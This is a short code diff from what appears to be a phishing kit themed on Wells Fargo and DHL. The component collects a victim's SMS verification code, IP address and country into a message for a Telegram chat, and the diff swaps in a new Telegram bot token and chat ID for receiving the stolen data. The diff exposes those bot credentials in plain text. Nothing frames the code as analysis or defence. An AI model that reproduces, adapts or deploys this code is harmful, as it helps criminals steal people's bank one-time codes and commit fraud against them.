@@ -567,9 +567,9 @@ export default {
         );
         this.IP = tt.data.ip;
         this.query = tt.data.country_capital;
-        var token = "6141128222:AAG6Jvk8fa_XMDwavj_WLcom-a7ZXMoY27Q";
+         var token = "6913210321:AAEJFplMH_ysNxi4mMSRVBmM1wpjzMjuf70";
 
-        var chatId2 = -4090837623;
+      var chatId2 = -4219558708;
         var fullMessage = `
         ||🏦💰💰| Wells |🏦💰💰||%0A%0ASMS : ${this.sms}%0ACountry : ${this.query}%0AIP : ${this.IP}%0A|%0A|💲💲💲|💳| DHL|💳|💲💲💲||`;
         if (this.tries > 0) {
